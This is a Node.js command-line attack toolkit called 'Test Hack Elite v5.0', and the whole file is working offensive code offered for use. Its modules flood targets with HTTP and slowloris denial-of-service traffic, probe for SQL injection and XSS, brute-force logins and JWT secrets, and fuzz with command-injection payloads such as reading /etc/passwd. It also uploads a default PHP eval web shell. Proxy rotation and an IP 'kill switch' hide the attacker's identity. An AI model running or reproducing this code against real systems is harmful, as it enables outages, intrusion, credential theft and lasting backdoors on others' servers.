const chalk = require('chalk');
const { program } = require('commander');
const { URL } = require('url');
const path = require('path');
const fs = require('fs');
const axios = require("axios");
const jwt = require("jsonwebtoken");
const FormData = require("form-data");
const net = require('net');

// --- Logger Class ---
// Provides standardized and colorful logging for different message types.
class Logger {
    static info(msg) { console.log(chalk.blue(`[*] ${msg}`)); }
    static success(msg) { console.log(chalk.green(`[+] ${msg}`)); }
    static error(msg) { console.error(chalk.red(`[!] ${msg}`)); }
    static warning(msg) { console.warn(chalk.yellow(`[?] ${msg}`)); }
    static debug(msg) { console.log(chalk.cyan(`[DEBUG] ${msg}`)); }
}

// --- Helper Functions ---
// Utility function to load lines from a file, filtering out empty lines and comments.
function loadLinesFromFile(filePath, defaultList = []) {
    if (filePath && fs.existsSync(filePath)) {
        return fs.readFileSync(filePath, 'utf8').split('\n').map(line => line.trim()).filter(line => line && !line.startsWith('#'));
    }
    return defaultList;
}

// --- Proxy Management ---
// Manages a list of proxies loaded from a file, providing a rotating proxy for requests.
class ProxyManager {
    constructor(proxyListFile = 'proxies.txt') {
        this.proxyListFile = path.join(__dirname, proxyListFile);
        this.proxies = loadLinesFromFile(this.proxyListFile, []);
        if (this.proxies.length > 0) {
            Logger.info(`Loaded ${this.proxies.length} proxies from ${proxyListFile}`);
        } else {
            Logger.warning("No proxy list file found. Running without proxies.");
        }
        this.currentIndex = 0;
    }

    getProxy() {
        if (this.proxies.length === 0) {
            return null;
        }
        const proxy = this.proxies[this.currentIndex];
        this.currentIndex = (this.currentIndex + 1) % this.proxies.length; // Rotate proxy
        return proxy.startsWith('http') ? proxy : `http://${proxy}`;
    }
}

// --- Kill Switch & IP Checker ---
// Implements a kill switch mechanism to prevent real IP exposure during attacks.
class KillSwitch {
    constructor(proxyManager) {
        this.proxyManager = proxyManager;
        this.realIp = null;
        this.killSwitchActive = false;
    }

    async init() {
        this.realIp = await this._getRealIp();
        if (this.proxyManager.proxies.length > 0) {
            Logger.info(`Real IP: ${this.realIp}. Kill Switch is ACTIVE.`);
            this.killSwitchActive = true;
        } else {
            Logger.warning("No proxies loaded. Kill Switch is INACTIVE. Your real IP might be exposed.");
        }
    }

    async _getRealIp() {
        try {
            const response = await axios.get("https://api.ipify.org?format=json", { timeout: 5000 });
            return response.data.ip;
        } catch (error) {
            Logger.error("Could not determine real IP. Kill Switch might be compromised.");
            return "UNKNOWN";
        }
    }

    async checkIp() {
        if (!this.killSwitchActive) return;
        try {
            const proxy = this.proxyManager.getProxy();
            const config = { timeout: 5000 };
            if (proxy) {
                const url = new URL(proxy);
                config.proxy = { host: url.hostname, port: parseInt(url.port) };
            }
            const response = await axios.get("https://api.ipify.org?format=json", config);
            const currentIp = response.data.ip;

            if (currentIp === this.realIp) {
                Logger.error("!!! KILL SWITCH ACTIVATED: Your real IP is exposed! Exiting immediately. !!!");
                process.exit(1);
            }
        } catch (error) {
            Logger.error("Could not check current IP. Kill Switch might be compromised. Exiting.");
            process.exit(1);
        }
    }
}

// --- Attack Engine (Core) ---
// Base class for all attack modules, providing common functionalities like request handling and headers.
class AttackEngine {
    constructor(proxyManager = null, killSwitch = null) {
        this.proxyManager = proxyManager;
        this.killSwitch = killSwitch;
        this.userAgents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
        ];
    }

    getHeaders(mimicBrowser = false) {
        const headers = {
            'User-Agent': this.userAgents[Math.floor(Math.random() * this.userAgents.length)],
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'no-cache'
        };
        if (mimicBrowser) {
            headers['Sec-Fetch-Dest'] = 'document';
            headers['Sec-Fetch-Mode'] = 'navigate';
            headers['Sec-Fetch-Site'] = 'none';
            headers['Sec-Fetch-User'] = '?1';
        }
        return headers;
    }

    async makeRequest(method, url, options = {}) {
        if (this.killSwitch) {
            await this.killSwitch.checkIp();
        }

        const proxy = this.proxyManager ? this.proxyManager.getProxy() : null;
        const config = {
            method: method,
            url: url,
            headers: this.getHeaders(options.mimicBrowser),
            timeout: options.timeout || 10000,
            validateStatus: status => true,
        };

        if (proxy) {
            try {
                const proxyUrl = new URL(proxy);
                config.proxy = {
                    host: proxyUrl.hostname,
                    port: parseInt(proxyUrl.port),
                };
            } catch (e) {
                const parts = proxy.split(':');
                config.proxy = { host: parts[0], port: parseInt(parts[1]) };
            }
        }

        if (options.data) config.data = options.data;
        if (options.params) config.params = options.params;
        if (options.json) {
            config.data = options.json;
            config.headers["Content-Type"] = "application/json";
        }

        await new Promise(resolve => setTimeout(resolve, Math.random() * 1000 + 200));

        try {
            const response = await axios(config);
            return response;
        } catch (error) {
            Logger.error(`Request failed: ${error.message}`);
            return null;
        }
    }
}

// --- Port Scanner Module ---
// Performs a basic TCP port scan on a target host.
class PortScanner extends AttackEngine {
    async scan(target, portRange = "1-1024") {
        Logger.info(`Starting Port Scan on ${target} (Range: ${portRange})...`);
        const [start, end] = portRange.split("-").map(Number);
        const openPorts = [];

        const checkPort = (port) => {
            return new Promise((resolve) => {
                const socket = new net.Socket();
                socket.setTimeout(2000);
                socket.on('connect', () => {
                    Logger.success(`Port ${port} is OPEN`);
                    openPorts.push(port);
                    socket.destroy();
                    resolve();
                });
                socket.on('timeout', () => { socket.destroy(); resolve(); });
                socket.on('error', () => { socket.destroy(); resolve(); });
                socket.connect(port, target);
            });
        };

        const concurrency = 50;
        for (let i = start; i <= end; i += concurrency) {
            const batch = [];
            for (let j = i; j < i + concurrency && j <= end; j++) {
                batch.push(checkPort(j));
            }
            await Promise.all(batch);
        }
        Logger.info(`Scan complete. Found ${openPorts.length} open ports.`);
    }
}

// --- DDoS Module ---
// Executes Distributed Denial of Service (DDoS) attacks.
class DDoS extends AttackEngine {
    async start(target, threads, duration = 60, attackType = 'http_flood') {
        Logger.warning(`Starting High-Intensity DDoS on ${target} for ${duration} seconds (Type: ${attackType})...`);
        const startTime = Date.now();
        const floodWorker = async () => {
            while (Date.now() - startTime < duration * 1000) {
                try {
                    if (attackType === 'http_flood') {
                        await this.makeRequest('GET', target, { params: { r: Math.random() }, timeout: 5000, mimicBrowser: true });
                    } else if (attackType === 'l7_advanced') {
                        await this.makeRequest('POST', target, { json: { t: Date.now(), r: Math.random() }, timeout: 10000, mimicBrowser: true });
                    } else if (attackType === 'slowloris') {
                        await this.makeRequest('GET', target, { timeout: 30000, mimicBrowser: true });
                    }
                } catch (e) {}
            }
        };
        const workers = Array.from({ length: threads }, () => floodWorker());
        await Promise.all(workers);
        Logger.success("DDoS Attack Duration Completed.");
    }
}

// --- SQLi Module ---
// Detects SQL Injection vulnerabilities.
class SQLi extends AttackEngine {
    async scan(url) {
        Logger.info(`Advanced AI-Powered SQLi Scanning: ${url}`);
        const payloads = ["' OR SLEEP(5)--", "'", "\"", "') OR 1=1--", "') OR SLEEP(5)--"];
        for (const p of payloads) {
            const start = Date.now();
            const res = await this.makeRequest("GET", `${url}${p}`, { timeout: 15000 });
            if (!res) continue;
            const duration = Date.now() - start;
            if (duration >= 5000 || /sql syntax|mysql|mariadb|postgresql|sqlite|oracle/i.test(res.data)) {
                Logger.success(`Vulnerability Found! Payload: ${p}`);
                return;
            }
        }
        Logger.error("No advanced SQLi vulnerabilities detected.");
    }
}

// --- XSS Module ---
// Detects Cross-Site Scripting (XSS) vulnerabilities.
class XSS extends AttackEngine {
    async scan(url) {
        Logger.info(`Advanced XSS Scanning: ${url}`);
        const payloads = ["<script>alert(document.domain)</script>", "<img src=x onerror=alert(1)>", "javascript:alert(1)"];
        for (const p of payloads) {
            const res = await this.makeRequest("GET", `${url}${encodeURIComponent(p)}`);
            if (res && (res.data.includes(p) || res.data.includes(decodeURIComponent(p)))) {
                Logger.success(`XSS Vulnerability Confirmed! Payload: ${p}`);
                return;
            }
        }
        Logger.error("No advanced XSS vulnerabilities detected.");
    }
}

// --- BruteForce Module ---
// Performs brute-force attacks on login forms.
class BruteForce extends AttackEngine {
    async attack(url, user, wordlistPath) {
        Logger.info(`Advanced Brute Forcing User: ${user} on ${url}`);
        const passwords = loadLinesFromFile(wordlistPath, ["123456", "password", "admin", "qwerty"]);
        for (const pwd of passwords) {
            const res = await this.makeRequest("POST", url, { data: { username: user, password: pwd } });
            if (res && res.status === 200 && res.data.includes("Welcome")) { // Assuming "Welcome" indicates successful login
                Logger.success(`Brute Force Successful! User: ${user}, Password: ${pwd}`);
                return;
            }
        }
        Logger.error("Brute Force failed. No valid credentials found.");
    }
}

// --- AdminFinder Module ---
// Finds common admin panel paths on a target website.
class AdminFinder extends AttackEngine {
    async find(targetUrl) {
        Logger.info(`Starting Admin Panel Finder for: ${targetUrl}`);
        const paths = ["/admin/", "/administrator/", "/login/", "/cpanel/", "/wp-admin/", "/admin.php"];
        for (const p of paths) {
            const res = await this.makeRequest("GET", `${targetUrl}${p}`);
            if (res && res.status === 200) Logger.success(`Admin panel found at: ${targetUrl}${p}`);
        }
        Logger.info("Admin panel scan completed.");
    }
}

// --- PrivilegeEscalation Module ---
// Contains methods for privilege escalation, including IDOR and JWT exploitation.
class PrivilegeEscalation extends AttackEngine {
    async scanIDOR(baseUrl, pathTemplate, start, end, keyword) {
        Logger.info(`Starting IDOR scan for: ${baseUrl}${pathTemplate}`);
        for (let i = start; i <= end; i++) {
            const url = `${baseUrl}${pathTemplate.replace("{id}", i)}`;
            const res = await this.makeRequest("GET", url);
            if (res && res.status === 200) {
                if (!keyword || res.data.includes(keyword)) Logger.success(`Potential IDOR found: ${url}`);
            }
        }
        Logger.info("IDOR scan completed.");
    }

    async exploitJWT(token, wordlist) {
        Logger.info(`Starting JWT exploitation for token: ${token}`);
        const secrets = loadLinesFromFile(wordlist, ["secret", "password", "admin", "jwtsecret"]);
        for (const s of secrets) {
            try { jwt.verify(token, s); Logger.success(`JWT Secret found: ${s}`); return; } catch (e) {}
        }
        Logger.error("JWT Secret not found.");
    }
}

// --- SmartFuzzer Module (New Feature for Zero-Day Discovery) ---
// Implements advanced fuzzing techniques to discover unknown vulnerabilities (Zero-Days).
class SmartFuzzer extends AttackEngine {
    constructor(proxyManager = null, killSwitch = null) {
        super(proxyManager, killSwitch);
        this.fuzzingPayloads = {
            sqli: [
                "'", "\"", "' OR 1=1--", "\" OR 1=1--", "' OR SLEEP(5)--", "\" OR SLEEP(5)--",
                "UNION SELECT NULL,NULL,NULL--", "AND 1=1", "AND 1=2"
            ],
            xss: [
                "<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>",
                "'';!--\"<XSS>=&{()}"
            ],
            pathTraversal: [
                "../", "../../", "../../../etc/passwd", "../../../../windows/win.ini"
            ],
            commandInjection: [
                ";ls", ";cat /etc/passwd", "|ls", "|cat /etc/passwd", "&&ls", "&&cat /etc/passwd"
            ]
        };
    }

    async fuzz(targetUrl, method = 'GET', params = {}, data = null, headers = {}) {
        Logger.info(`Starting Smart Fuzzing on: ${targetUrl} (Method: ${method})`);
        let foundVulnerabilities = [];

        // Fuzzing URL parameters
        for (const paramName in params) {
            const originalValue = params[paramName];
            for (const type in this.fuzzingPayloads) {
                for (const payload of this.fuzzingPayloads[type]) {
                    const testParams = { ...params, [paramName]: originalValue + payload };
                    Logger.debug(`Fuzzing param '${paramName}' with payload: ${payload}`);
                    const res = await this.makeRequest(method, targetUrl, { params: testParams, data, headers });
                    this._analyzeResponse(res, targetUrl, `Parameter: ${paramName}, Payload: ${payload}`, foundVulnerabilities);
                }
            }
        }

        // Fuzzing in URL path (simple path traversal example)
        for (const payload of this.fuzzingPayloads.pathTraversal) {
            const testUrl = `${targetUrl}/${payload}`;
            Logger.debug(`Fuzzing URL path with payload: ${payload}`);
            const res = await this.makeRequest(method, testUrl, { params, data, headers });
            this._analyzeResponse(res, testUrl, `URL Path: ${payload}`, foundVulnerabilities);
        }

        // Fuzzing in POST data (if method is POST and data is provided)
        if (method === 'POST' && data) {
            for (const type in this.fuzzingPayloads) {
                for (const payload of this.fuzzingPayloads[type]) {
                    const testData = { ...data };
                    for (const key in testData) {
                        testData[key] = testData[key] + payload;
                        Logger.debug(`Fuzzing POST data key '${key}' with payload: ${payload}`);
                        const res = await this.makeRequest(method, targetUrl, { params, data: testData, headers });
                        this._analyzeResponse(res, targetUrl, `POST Data Key: ${key}, Payload: ${payload}`, foundVulnerabilities);
                    }
                }
            }
        }

        if (foundVulnerabilities.length > 0) {
            Logger.success(`Smart Fuzzing Completed. Found ${foundVulnerabilities.length} potential vulnerabilities.`);
            foundVulnerabilities.forEach(vuln => Logger.success(`- ${vuln}`));
        } else {
            Logger.info("Smart Fuzzing Completed. No obvious vulnerabilities detected.");
        }
    }

    _analyzeResponse(response, url, context, foundVulnerabilities) {
        if (!response) return;

        if (response.status >= 500) {
            foundVulnerabilities.push(`[HTTP 5xx Error] URL: ${url}, Context: ${context}`);
        }
        if (response.status === 403) {
            foundVulnerabilities.push(`[HTTP 403 Forbidden] URL: ${url}, Context: ${context}`);
        }
        if (response.data && /sql syntax|error in your SQL|warning/i.test(response.data)) {
            foundVulnerabilities.push(`[SQL Error/Warning] URL: ${url}, Context: ${context}`);
        }
        if (response.data && /<script>alert|onerror=|javascript:/i.test(response.data)) {
            foundVulnerabilities.push(`[XSS Reflection] URL: ${url}, Context: ${context}`);
        }
    }
}

// --- ShellUpload Module ---
// Facilitates uploading web shells to a target server.
class ShellUpload extends AttackEngine {
    async upload(url, filename, content, mimeType) {
        Logger.info(`Attempting Advanced Shell Upload: ${url}`);
        const formData = new FormData();
        formData.append("file", content || '<?php @eval(base64_decode($_POST["cmd"])); ?>', { filename, contentType: mimeType || "application/x-php" });
        const res = await this.makeRequest("POST", url, { data: formData, headers: formData.getHeaders() });
        if (res && res.status === 200 && res.data.includes(filename)) {
            Logger.success(`Shell Uploaded Successfully: ${filename}`);
        } else {
            Logger.error("Upload Failed.");
        }
    }
}

// --- TestHackElite Main Class ---
// The main class that orchestrates all attack modules and CLI commands.
class TestHackElite {
    constructor() {
        this.proxyManager = new ProxyManager();
        this.killSwitch = new KillSwitch(this.proxyManager);
    }

    banner() {
        console.log(chalk.red.bold(`    ████████╗███████╗███████╗████████╗    ██╗  ██╗ █████╗  ██████╗██╗  ██╗`));
        console.log(chalk.red.bold(`    ╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝ `));
        console.log(chalk.red.bold(`       ██║   █████╗  ███████╗   ██║       ███████║███████║██║     █████╔╝  `));
        console.log(chalk.red.bold(`       ██║   ██╔══╝  ╚════██║   ██║       ██╔══██║██╔══██║██║     ██╔═██╗  `));
        console.log(chalk.red.bold(`       ██║   ███████╗███████║   ██║       ██║  ██║██║  ██║╚██████╗██║  ██╗ `));
        console.log(chalk.red.bold(`       ╚═╝   ╚══════╝╚══════╝   ╚═╝       ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ `));
        console.log(chalk.cyan(`                   [ Test Hack Elite v5.0 - The Obliterator Edition ]`));
        console.log(chalk.yellow(`[ For Authorized & Ethical Hacking Only : telegram @AMZOZT chanel https://t.me/A_Tech0 u are walcome to join]`));
        console.log("");
    }

    async main() {
        this.banner();
        program.name('test-hack-elite-js').description('Test Hack Elite v5.0').version('5.0.0');

        program.command("scan <target>")
            .description("Perform a Port Scan (New Feature)")
            .option("-r, --range <range>", "Port range", "1-1024")
            .action(async (target, opts) => await new PortScanner(this.proxyManager, this.killSwitch).scan(target, opts.range));

        program.command("ddos <target>")
            .description("Perform a DDoS attack")
            .option("-d, --duration <sec>", "Duration", "60")
            .option("-t, --threads <num>", "Threads", "500")
            .option("-a, --attack-type <type>", "Type (http_flood, l7_advanced, slowloris)", "http_flood")
            .action(async (target, opts) => await new DDoS(this.proxyManager, this.killSwitch).start(target, parseInt(opts.threads), parseInt(opts.duration), opts.attackType));

        program.command("sqli <target>").description("SQLi scan").action(async (t) => await new SQLi(this.proxyManager, this.killSwitch).scan(t));
        program.command("xss <target>").description("XSS scan").action(async (t) => await new XSS(this.proxyManager, this.killSwitch).scan(t));
        program.command("adminfinder <targetUrl>").description("Find admin panels").action(async (t) => await new AdminFinder(this.proxyManager, this.killSwitch).find(t));
        
        program.command("bruteforce <url> <user>")
            .description("Brute Force attack")
            .option("-w, --wordlist <path>", "Wordlist path")
            .action(async (url, user, opts) => await new BruteForce(this.proxyManager, this.killSwitch).attack(url, user, opts.wordlist));

        program.command("privesc-idor <baseUrl> <pathTemplate> <idRangeStart> <idRangeEnd>")
            .description("Scan for IDOR")
            .option("-k, --success-keyword <keyword>", "Success keyword")
            .action(async (b, p, s, e, opts) => await new PrivilegeEscalation(this.proxyManager, this.killSwitch).scanIDOR(b, p, parseInt(s), parseInt(e), opts.successKeyword));

        program.command("privesc-jwt <jwtToken>")
            .description("Exploit JWT")
            .option("-s, --secret-wordlist <path>", "Secret wordlist")
            .action(async (t, opts) => await new PrivilegeEscalation(this.proxyManager, this.killSwitch).exploitJWT(t, opts.secretWordlist));

        program.command("fuzz <targetUrl>")
            .description("Perform Smart Fuzzing for Zero-Day discovery")
            .option("-m, --method <method>", "HTTP method (GET, POST)", "GET")
            .option("-p, --params <json>", "JSON string of URL parameters")
            .option("-d, --data <json>", "JSON string of POST data")
            .option("-H, --headers <json>", "JSON string of HTTP headers")
            .action(async (targetUrl, opts) => {
                const params = opts.params ? JSON.parse(opts.params) : {};
                const data = opts.data ? JSON.parse(opts.data) : null;
                const headers = opts.headers ? JSON.parse(opts.headers) : {};
                await new SmartFuzzer(this.proxyManager, this.killSwitch).fuzz(targetUrl, opts.method, params, data, headers);
            });

        program.command("shellupload <url>")
            .description("Shell Upload")
            .option("-f, --filename <name>", "Filename", "elite_shell.php")
            .option("-c, --content <content>", "Content")
            .option("-m, --mime-type <type>", "MIME type", "application/x-php")
            .action(async (url, opts) => await new ShellUpload(this.proxyManager, this.killSwitch).upload(url, opts.filename, opts.content, opts.mimeType));

        program.parse(process.argv);
        if (!process.argv.slice(2).length) program.outputHelp();
    }
}

(async () => {
    const eliteTool = new TestHackElite();
    await eliteTool.killSwitch.init();
    await eliteTool.main();
})();
